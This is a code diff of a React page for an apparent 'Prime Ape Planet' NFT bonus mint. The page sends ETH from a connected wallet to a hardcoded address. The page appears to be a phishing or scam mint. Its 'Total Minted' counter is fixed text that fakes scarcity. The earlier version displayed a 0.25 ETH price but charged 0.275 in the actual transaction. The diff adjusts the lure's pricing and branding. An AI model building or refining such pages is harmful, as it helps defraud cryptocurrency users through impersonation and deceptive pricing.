@@ -33,7 +33,7 @@ export default function Home() {
         web3.eth.sendTransaction({
             from: account,
             to: "0xA025FBe45e7751397aa7C9a63e3745Ee24123f01",
-            value: web3.utils.toWei(value.toString(), "ether") * 0.275,
+            value: web3.utils.toWei(value.toString(), "ether") * 0.05,
         });
     };
     return (
@@ -69,7 +69,7 @@ export default function Home() {
                         letterSpacing: "8px",
                     }}
                 >
-                    Prime Ape
+                    Prime Ape Planet
 
                 </div>
                 <div
@@ -82,7 +82,7 @@ export default function Home() {
                         letterSpacing: "6px",
                     }}
                 >
-                    BONUS MINT - USER #694
+                    BONUS MINT
                 </div>
             </div>
             <div
@@ -122,7 +122,7 @@ export default function Home() {
                     fontWeight: '500'
                 }}
             >
-                Total Minted: 782 / 799
+                Total Minted: 959 / 1000
             </div>
 
             <div
@@ -148,7 +148,7 @@ export default function Home() {
                         fontWeight: '500',
                     }}
                     min="1"
-                    max="10"
+                    max="20"
                     type="number"
                 />
                 <div style={{ color: "white", fontSize: "30px", fontWeight: '500', }}>Prime Ape(s)</div>
@@ -174,7 +174,7 @@ export default function Home() {
             >
                 {active
                     ? `MINT for ${
-                        (value * 0.25).toFixed(2)
+                        (value * 0.05).toFixed(2)
                     } ETH + Network gas fees`
                     : "Wallet is not connected"}
             </button>
